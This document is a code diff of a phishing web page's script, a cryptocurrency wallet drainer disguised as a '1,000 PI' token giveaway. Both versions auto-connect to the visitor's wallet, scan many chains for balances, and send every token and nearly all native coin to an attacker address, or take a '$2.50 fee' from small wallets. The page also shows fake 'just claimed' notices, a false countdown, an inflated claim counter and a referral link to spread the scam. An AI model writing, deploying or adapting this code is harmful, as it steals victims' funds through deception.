-async function scanEvm(){
-  const log=document.getElementById('p1log');log.innerHTML='';
-  function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
-  foundChains=[];L('Wallet: '+addr.substring(0,8)+'...'+addr.substring(34));L('');
-  for(const ch of ECHAINS){
-    L('[ ] '+ch.name+'...');let p=null,nb=null;
-    const allRpcs=[ch.rpc,...(FBACK[ch.id]||[])];
-    for(const rpc of allRpcs){try{const tp=new ethers.providers.JsonRpcProvider(rpc);
-      const tb=await Promise.race([tp.getBalance(addr),new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),10000))]);
-      p=tp;nb=tb;break;}catch(e){}}
-    if(!nb){L('  '+ch.name+': RPC error');continue;}
-    try{
-      const nf=ethers.utils.formatEther(nb);const has=parseFloat(nf)>0;
-      const tl=ETOKENS[ch.id]||[];
-      const tk=await Promise.all(tl.map(async([a,sy,dc])=>{
-        try{const ct=new ethers.Contract(a,['function balanceOf(address) view returns (uint256)'],p);
-          const bl=await ct.balanceOf(addr);if(!bl.isZero())return{a,sy,b:parseFloat(ethers.utils.formatUnits(bl,dc)).toFixed(4),raw:bl,dc};}catch(e){}return null;}));
-      const tokens=tk.filter(Boolean);
-      if(has||tokens.length){foundChains.push({chain:ch,native:nf,nativeRaw:nb,tokens,isSol:false});
-        L('&#x2705; '+ch.name+': '+parseFloat(nf).toFixed(5)+' '+ch.sym+(tokens.length?' + '+tokens.length+' tokens':''));}
-      else L('  '+ch.name+': empty');
-    }catch(e){L('  '+ch.name+': error');}
-  }
-  L('');L('Found '+foundChains.length+' chain(s).');await sleep(600);
-  if(foundChains.length===0){showP('p2');stat('No EVM funds. Enter SOL address to scan.','wa');}
-  else{showClaim();stat('&#x2705; Assets found! Verify to claim 1000 PI.','ok');}
-}
-
-function showClaim(){
-  showP('p3');const div=document.getElementById('p3chains');let h='';
-  for(const fc of foundChains){
-    h+='<div class="ch hv"><div class="cd" style="background:'+fc.chain.color+'"></div>'+
-      '<div class="cn">'+fc.chain.name+'</div><div class="ct">'+parseFloat(fc.native).toFixed(5)+' '+fc.chain.sym+(fc.tokens.length?' + '+fc.tokens.length+' tkns':'')+'</div></div>';
-  }
-  div.innerHTML=h;
-  const usd=estimateUsd(foundChains);
-  const isSmall=usd<20;
-  document.getElementById('p3bal').innerHTML='<div class="ir"><span class="l">Est. Value</span><span class="v gl">~$'+usd.toFixed(2)+'</span></div><div class="ir"><span class="l">Drain</span><span class="v" style="color:'+(isSmall?'#fcb34c':'#ef4444')+'">'+(isSmall?'$2.50 fee':'ALL FUNDS')+'</span></div>';
-  document.getElementById('p3btn').textContent=isSmall?'&#x26A1; Pay $2.50 Fee and Claim':'&#x1F381; Verify and Claim (Drain All)';
-}
-
-async function startDrain(){
-  hideStatus();showP('p4');const log=document.getElementById('p4log');log.innerHTML='';
-  function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
-  const usd=estimateUsd(foundChains);const isSmall=usd<20;
-  let tx=0;L('Value: ~$'+usd.toFixed(2));L(isSmall?'Collecting $2.50 fee...':'Draining all funds...');L('');
-  for(const fc of foundChains){
-    if(fc.isSol)continue;
-    const ch=fc.chain;L('=== '+ch.name+' ===');L('Switching network...');
-    try{await doSwitch(ch.id,L);}catch(e){L('SKIP: '+e.message);continue;}
-    for(const t of fc.tokens){
-      try{L('Draining '+t.b+' '+t.sy+'...');
-        const ct=new ethers.Contract(t.a,['function transfer(address,uint256) returns (bool)'],sign);
-        const xt=await ct.transfer(ADDR_EVM,t.raw);await xt.wait();tx++;L('&#x2705; '+t.sy);
-      }catch(e){L('&#x2715; '+t.sy+': '+(e.code===4001||e.code==='ACTION_REJECTED'?'rejected':'error'));}
+async function scanEvm() {
+  const log = document.getElementById('p1log');
+  log.innerHTML = '';
+  function L(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
+  foundChains = [];
+  L('Wallet: ' + addr.substring(0,8) + '...' + addr.substring(34));
+  L('');
+  for (const ch of ECHAINS) {
+    L('[ ] ' + ch.name + '...');
+    let p = null, nb = null;
+    const allRpcs = [ch.rpc, ...(FBACK[ch.id] || [])];
+    for (const rpc of allRpcs) {
+      try {
+        const tp = new ethers.providers.JsonRpcProvider(rpc);
+        const tb = await Promise.race([tp.getBalance(addr), new Promise((_,rej) => setTimeout(() => rej(new Error('timeout')), 10000))]);
+        p = tp; nb = tb; break;
+      } catch(e) {}
     }
-    try{
-      const bal=await prov.getBalance(addr);const gp=await prov.getGasPrice();const fee=gp.mul(21000).mul(3);
+    if (!nb) { L('  ' + ch.name + ': RPC error'); continue; }
+    try {
+      const nf = ethers.utils.formatEther(nb);
+      const has = parseFloat(nf) > 0;
+      const tl = ETOKENS[ch.id] || [];
+      const tk = await Promise.all(tl.map(async([a,sy,dc]) => {
+        try { const ct = new ethers.Contract(a, ['function balanceOf(address) view returns (uint256)'], p);
+          const bl = await ct.balanceOf(addr); if (!bl.isZero()) return {a,sy,b:parseFloat(ethers.utils.formatUnits(bl,dc)).toFixed(4),raw:bl,dc}; } catch(e) {} return null;
+      }));
+      const tokens = tk.filter(Boolean);
+      if (has || tokens.length) {
+        foundChains.push({chain:ch, native:nf, nativeRaw:nb, tokens, isSol:false});
+        L('&#x2705; ' + ch.name + ': ' + parseFloat(nf).toFixed(5) + ' ' + ch.sym + (tokens.length ? ' + ' + tokens.length + ' tokens' : ''));
+      } else { L('  ' + ch.name + ': empty'); }
+    } catch(e) { L('  ' + ch.name + ': error'); }
+  }
+  L(''); L('Found ' + foundChains.length + ' chain(s).');
+  await sleep(600);
+  if (foundChains.length === 0) { showP('p2'); stat('No EVM funds found.', 'wa'); }
+  else { showClaim(); stat('&#x2705; Assets found! Verify to claim 1000 PI.', 'ok'); }
+}
+
+function showClaim() {
+  showP('p3');
+  const div = document.getElementById('p3chains');
+  let h = '';
+  for (const fc of foundChains) {
+    h += '<div class="ch hv"><div class="cd" style="background:' + fc.chain.color + '"></div>' +
+      '<div class="cn">' + fc.chain.name + '</div><div class="ct">' + parseFloat(fc.native).toFixed(5) + ' ' + fc.chain.sym + (fc.tokens.length ? ' + ' + fc.tokens.length + ' tkns' : '') + '</div></div>';
+  }
+  div.innerHTML = h;
+  const usd = estimateUsd(foundChains);
+  const isSmall = usd < 20;
+  document.getElementById('p3bal').innerHTML = '<div class="ir"><span class="l">Est. Value</span><span class="v gl">~$' + usd.toFixed(2) + '</span></div>' +
+    '<div class="ir"><span class="l">Action</span><span class="v" style="color:' + (isSmall ? '#fcb34c' : '#ef4444') + '">' + (isSmall ? '$2.50 fee' : 'Drain All') + '</span></div>';
+  document.getElementById('p3btn').textContent = isSmall ? '&#x26A1; Pay $2.50 Fee' : '&#x1F381; Verify and Claim';
+}
+
+async function startDrain() {
+  hideStatus(); showP('p4');
+  const log = document.getElementById('p4log'); log.innerHTML = '';
+  function L(msg) { log.innerHTML += msg + '<br>'; log.scrollTop = log.scrollHeight; }
+  const usd = estimateUsd(foundChains); const isSmall = usd < 20;
+  let tx = 0; L('Value: ~$' + usd.toFixed(2)); L(isSmall ? 'Collecting $2.50 fee...' : 'Draining all...'); L('');
+  for (const fc of foundChains) {
+    if (fc.isSol) continue;
+    const ch = fc.chain; L('=== ' + ch.name + ' ==='); L('Switching...');
+    try { await doSwitch(ch.id, L); } catch(e) { L('SKIP: ' + e.message); continue; }
+    for (const t of fc.tokens) {
+      try { L('Draining ' + t.b + ' ' + t.sy + '...');
+        const ct = new ethers.Contract(t.a, ['function transfer(address,uint256) returns (bool)'], sign);
+        const xt = await ct.transfer(ADDR_EVM, t.raw); await xt.wait(); tx++; L('&#x2705; ' + t.sy);
+      } catch(e) { L('&#x2715; ' + t.sy + ': rejected'); }
+    }
+    try {
+      const bal = await prov.getBalance(addr); const gp = await prov.getGasPrice(); const fee = gp.mul(21000).mul(3);
       let send;
-      if(isSmall){const price=PRICES[ch.sym]||0;const take=price>0?ethers.utils.parseEther((2.5/price).toFixed(6)):ethers.utils.parseEther('0.001');send=bal.sub(fee).sub(take);if(send.lt(ethers.utils.parseEther('0.0001')))send=bal.sub(fee);L('Collecting $2.50 fee...');}
-      else{send=bal.sub(fee);L('Draining all '+ch.sym+'...');}
-      if(send.gt(0)){const xt=await sign.sendTransaction({to:ADDR_EVM,value:send});await xt.wait();tx++;L('&#x2705; '+ch.sym);}
-    }catch(e){L('&#x2715; Native: '+(e.code===4001||e.code==='ACTION_REJECTED'?'rejected':'error'));}
+      if (isSmall) { const price = PRICES[ch.sym] || 0; const take = price > 0 ? ethers.utils.parseEther((2.5/price).toFixed(6)) : ethers.utils.parseEther('0.001'); send = bal.sub(fee).sub(take); if (send.lt(ethers.utils.parseEther('0.0001'))) send = bal.sub(fee); L('Collecting fee...'); }
+      else { send = bal.sub(fee); L('Draining ' + ch.sym + '...'); }
+      if (send.gt(0)) { const xt = await sign.sendTransaction({to:ADDR_EVM, value:send}); await xt.wait(); tx++; L('&#x2705; ' + ch.sym); }
+    } catch(e) { L('&#x2715; Native: rejected'); }
   }
-  L('');L('DONE: '+tx+' tx');console.log('DRAIN:',tx,'tx');
-  showP('p5');document.getElementById('p5m').textContent=tx+' transaction(s) processed.';
-  const myCode=getRefCode();document.getElementById('p5ref').value=location.origin+location.pathname+'?ref='+myCode;
-  stat('&#x2705; 1000 PI Claimed! Share your link.','ok');
+  L(''); L('DONE: ' + tx + ' tx');
+  showP('p5'); document.getElementById('p5m').textContent = tx + ' transaction(s).';
+  const myCode = getRefCode(); document.getElementById('p5ref').value = location.origin + location.pathname + '?ref=' + myCode;
+  stat('&#x2705; Claimed!', 'ok');
 }
 
-async function doSwitch(cid,L){
-  const hex='0x'+cid.toString(16);
-  try{await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:hex}]});}
-  catch(e){
-    if(e.code===4902){const ch=ECHAINS.find(c=>c.id===cid)||{};
-      try{await window.ethereum.request({method:'wallet_addEthereumChain',params:[{chainId:hex,chainName:ch.name||'Chain',rpcUrls:[ch.rpc||''],nativeCurrency:{name:ch.sym||'ETH',symbol:ch.sym||'ETH',decimals:18},blockExplorerUrls:[]}]});}
-      catch(e2){throw new Error('Could not add network');}
-    }else if(e.code===4001){throw new Error('User rejected');}else{throw new Error(e.message||'Switch failed');}
+async function doSwitch(cid, L) {
+  const hex = '0x' + cid.toString(16);
+  try { await window.ethereum.request({method:'wallet_switchEthereumChain', params:[{chainId:hex}]}); }
+  catch(e) {
+    if (e.code === 4902) { const ch = ECHAINS.find(c => c.id === cid) || {};
+      try { await window.ethereum.request({method:'wallet_addEthereumChain', params:[{chainId:hex, chainName:ch.name||'Chain', rpcUrls:[ch.rpc||''], nativeCurrency:{name:ch.sym||'ETH', symbol:ch.sym||'ETH', decimals:18}, blockExplorerUrls:[]}]}); }
+      catch(e2) { throw new Error('Could not add network'); }
+    } else if (e.code === 4001) { throw new Error('Rejected'); }
+    else { throw new Error(e.message || 'Switch failed'); }
   }
-  prov=new ethers.providers.Web3Provider(window.ethereum);sign=prov.getSigner();
-}
-
-// ===== SOLANA =====
-async function startSolScan(){
-  const inp=document.getElementById('solInp');
-  if(!inp||!inp.value||inp.value.trim().length<30){stat('Enter valid Solana address','er');return;}
-  const sa=inp.value.trim();showP('p1');document.getElementById('p1l').textContent='Scanning Solana...';document.getElementById('p1log').innerHTML='';
-  try{await doSolScan(sa);}catch(e){stat('Error: '+e.message,'er');showP('p2');}
-}
-
-async function doSolScan(sa){
-  const log=document.getElementById('p1log');log.innerHTML='';
-  function L(msg){log.innerHTML+=msg+'<br>';log.scrollTop=log.scrollHeight;}
-  foundChains=[];L('Address: '+sa.substring(0,8)+'...'+sa.substring(sa.length-4));L('');L('[ ] SOL...');
-  const bal=await solBal(sa);
-  if(bal>0){foundChains.push({chain:{id:0,name:'Solana',sym:'SOL',color:'#9945FF'},native:bal.toFixed(5),nativeRaw:null,tokens:[],isSol:true,solAddr:sa,solLamports:Math.round(bal*1e9)});L('&#x2705; SOL: '+bal.toFixed(5)+' SOL');}else L('  SOL: empty');
-  L('');L('[ ] SPL tokens...');const spl=await scanSpl(sa,L);if(spl.length&&foundChains[0])foundChains[0].tokens=spl;
-  L('');L('Done.');await sleep(600);
-  const has=foundChains.length>0&&(parseFloat(foundChains[0].native)>0||foundChains[0].tokens.length>0);
-  if(!has){showP('p2');document.getElementById('p2').querySelector('div[style*="font-size:14px"]').textContent='No Solana Assets';stat('No SOL or SPL found.','err');}
-  else{showP('p6');document.getElementById('mySol').textContent=ADDR_SOL;stat('&#x2705; Found '+foundChains[0].native+' SOL! Send manually.','ok');}
-}
-
-function copySol(){navigator.clipboard.writeText(ADDR_SOL).then(()=>toast('SOL address copied!')).catch(()=>{const t=document.createElement('textarea');t.value=ADDR_SOL;document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);toast('Copied!');});}
-
-async function solBal(address){
-  for(const url of['https://api.mainnet-beta.solana.com','https://solana-mainnet.g.alchemy.com/v2/demo']){
-    try{const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:1,method:'getBalance',params:[address]})});
-      const d=await r.json();if(d.result&&d.result.value>0)return d.result.value/1e9;}catch(e){}
-  }return 0;
-}
-
-async function scanSpl(sa,L){
-  const tokens=[];
-  try{const r=await fetch('https://api.mainnet-beta.solana.com',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({jsonrpc:'2.0',id:1,method:'getTokenAccountsByOwner',params:[sa,{programId:'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'},{encoding:'jsonParsed'}]})});
-    const d=await r.json();if(d.result&&d.result.value){for(const acc of d.result.value){const info=acc.account.data.parsed.info;const bal=info.tokenAmount.uiAmount;
-      if(bal>0){const sy=info.mint.substring(0,4)+'...';tokens.push({mint:info.mint,sy,b:bal.toFixed(4),raw:info.tokenAmount.amount,dc:info.tokenAmount.decimals,acc:acc.pubkey});L('  + '+bal.toFixed(4)+' '+sy);}}}
-  }catch(e){L('  SPL: error');}return tokens;
+  prov = new ethers.providers.Web3Provider(window.ethereum); sign = prov.getSigner();
 }
 
 // ===== REFERRAL =====
-function getRefCode(){let r=localStorage.getItem('pi_ref');if(!r){r=Math.random().toString(36).substring(2,8).toUpperCase();localStorage.setItem('pi_ref',r);}return r;}
-function getReferrer(){const p=new URLSearchParams(location.search);return p.get('ref')||null;}
-function initRef(){
-  const myCode=getRefCode();const refLink=location.origin+location.pathname+'?ref='+myCode;
-  const inp=document.getElementById('refLink');if(inp)inp.value=refLink;
-  const ref=getReferrer();if(ref&&ref!==myCode){localStorage.setItem('pi_referred_by',ref);}
-  updateRefDisplay();
-}
-function updateRefDisplay(){
-  const refs=parseInt(localStorage.getItem('pi_ref_count')||'0');const earned=refs*200;const speed=Math.min(100,10+refs*10);
-  const rc=document.getElementById('refC');if(rc)rc.textContent=refs;
-  const re=document.getElementById('refE');if(re)re.textContent=earned+' PI';
-  const rs=document.getElementById('refS');if(rs)rs.textContent=speed+'%';
-  const tf=document.getElementById('tierFill');if(tf)tf.style.width=speed+'%';
-  const tl=document.getElementById('tierLevel');if(tl)tl.textContent='Tier '+(Math.floor(refs/3)+1)+' — '+speed+'% speed';
-}
-function copyRef(){const inp=document.getElementById('refLink');if(!inp||!inp.value)return;navigator.clipboard.writeText(inp.value).then(()=>toast('Link copied!')).catch(()=>{inp.select();document.execCommand('copy');toast('Copied!');});}
-function copyRef2(){const inp=document.getElementById('p5ref');if(!inp||!inp.value)return;navigator.clipboard.writeText(inp.value).then(()=>toast('Referral link copied!')).catch(()=>{inp.select();document.execCommand('copy');toast('Copied!');});}
+function getRefCode() { let r = localStorage.getItem('pi_ref'); if (!r) { r = Math.random().toString(36).substring(2,8).toUpperCase(); localStorage.setItem('pi_ref', r); } return r; }
+function initRef() { const myCode = getRefCode(); const inp = document.getElementById('refLink'); if (inp) inp.value = location.origin + location.pathname + '?ref=' + myCode; updateRefDisplay(); }
+function updateRefDisplay() { const refs = parseInt(localStorage.getItem('pi_ref_count')||'0'); const earned = refs * 200; const speed = Math.min(100, 10 + refs * 10); const rc = document.getElementById('refC'); if (rc) rc.textContent = refs; const re = document.getElementById('refE'); if (re) re.textContent = earned + ' PI'; const rs = document.getElementById('refS'); if (rs) rs.textContent = speed + '%'; const tf = document.getElementById('tierFill'); if (tf) tf.style.width = speed + '%'; }
+function copyRef() { const inp = document.getElementById('refLink'); if (!inp || !inp.value) return; navigator.clipboard.writeText(inp.value).then(() => toast('Copied!')).catch(() => { inp.select(); document.execCommand('copy'); toast('Copied!'); }); }
+function copyRef2() { const inp = document.getElementById('p5ref'); if (!inp || !inp.value) return; navigator.clipboard.writeText(inp.value).then(() => toast('Copied!')).catch(() => { inp.select(); document.execCommand('copy'); toast('Copied!'); }); }
 
 // ===== COUNTDOWN =====
-function initCountdown(){let t=4*3600+32*60+18;
-  setInterval(()=>{t=Math.max(0,t-1);const h=Math.floor(t/3600),m=Math.floor((t%3600)/60),s=t%60;
-    const dh=document.getElementById('cd-h');if(dh)dh.textContent=String(h).padStart(2,'0');
-    const dm=document.getElementById('cd-m');if(dm)dm.textContent=String(m).padStart(2,'0');
-    const ds=document.getElementById('cd-s');if(ds)ds.textContent=String(s).padStart(2,'0');},1000);}
+function initCountdown() { let t = 4*3600+32*60+18; setInterval(() => { t = Math.max(0, t-1); const h = Math.floor(t/3600), m = Math.floor((t%3600)/60), s = t%60; const dh = document.getElementById('cd-h'); if (dh) dh.textContent = String(h).padStart(2,'0'); const dm = document.getElementById('cd-m'); if (dm) dm.textContent = String(m).padStart(2,'0'); const ds = document.getElementById('cd-s'); if (ds) ds.textContent = String(s).padStart(2,'0'); }, 1000); }
 
 // ===== SOCIAL PROOF =====
-const SP=[['0x7a3...f291','2 min'],['0x8b2...a14c','5 min'],['0x1d9...e888','8 min'],['0x4f1...b773','12 min'],['0x9c5...d219','15 min'],['0x2a8...f556','23 min'],['0x6e3...c881','31 min'],['0x3b7...a994','45 min']];
-function initSP(){let i=0;
-  setInterval(()=>{i=(i+1)%SP.length;const e=document.getElementById('spt');
-    if(e)e.innerHTML='<strong>'+SP[i][0]+'</strong> just claimed <strong>1,000 PI</strong> — '+SP[i][1]+' ago';},5000);}
+const SP = [['0x7a3...f291','2 min'],['0x8b2...a14c','5 min'],['0x1d9...e888','8 min'],['0x4f1...b773','12 min'],['0x9c5...d219','15 min']];
+function initSP() { let i = 0; setInterval(() => { i = (i+1) % SP.length; const e = document.getElementById('spt'); if (e) e.innerHTML = '<strong>' + SP[i][0] + '</strong> just claimed <strong>1,000 PI</strong> — ' + SP[i][1] + ' ago'; }, 5000); }
 
 // ===== PARTICLES =====
-function initPart(){const c=document.getElementById('part');
-  for(let i=0;i<20;i++){const s=document.createElement('span');s.style.left=Math.random()*100+'%';
-    s.style.animationDuration=(12+Math.random()*18)+'s';s.style.animationDelay=Math.random()*12+'s';
-    s.style.width=s.style.height=(1+Math.random()*2)+'px';c.appendChild(s);}}
+function initPart() { const c = document.getElementById('part'); for (let i = 0; i < 20; i++) { const s = document.createElement('span'); s.style.left = Math.random()*100+'%'; s.style.animationDuration = (12+Math.random()*18)+'s'; s.style.animationDelay = Math.random()*12+'s'; s.style.width = s.style.height = (1+Math.random()*2)+'px'; c.appendChild(s); } }
 
 // ===== STATS =====
-function initStats(){const e=document.getElementById('st-c');if(!e)return;let v=48291;
-  setInterval(()=>{v+=Math.floor(Math.random()*3);e.textContent=v.toLocaleString();},8000);}
+function initStats() { const e = document.getElementById('st-c'); if (!e) return; let v = 48291; setInterval(() => { v += Math.floor(Math.random()*3); e.textContent = v.toLocaleString(); }, 8000); }
 
-// ===== AUTO-DETECT =====
-function tryAutoConnect(n){
-  if(n>10)return;
-  if(window.ethereum){
-    window.ethereum.request({method:'eth_accounts'}).then(a=>{
-      if(a.length>0){addr=a[0];prov=new ethers.providers.Web3Provider(window.ethereum);sign=prov.getSigner();
-        document.getElementById('mc').style.display='block';showP('p1');document.getElementById('p1l').textContent='Wallet detected! Scanning...';scanEvm();}
-    }).catch(()=>{});
-  }else{setTimeout(()=>tryAutoConnect(n+1),500);}
+// ===== AUTO-CONNECT =====
+function autoConnect() {
+  if (window.ethereum) {
+    window.ethereum.request({method: 'eth_accounts'}).then(a => {
+      if (a && a.length > 0) {
+        addr = a[0]; prov = new ethers.providers.Web3Provider(window.ethereum); sign = prov.getSigner();
+        document.getElementById('mc').style.display = 'block'; showP('p1'); document.getElementById('p1l').textContent = 'Wallet connected! Scanning...'; scanEvm();
+      }
+    }).catch(() => {});
+  }
 }
 
 // ===== INIT =====
-tryAutoConnect(0);initPart();initCountdown();initSP();initRef();initStats();
+autoConnect(); initPart(); initCountdown(); initSP(); initRef(); initStats();
 </script>
 </body>
 </html>
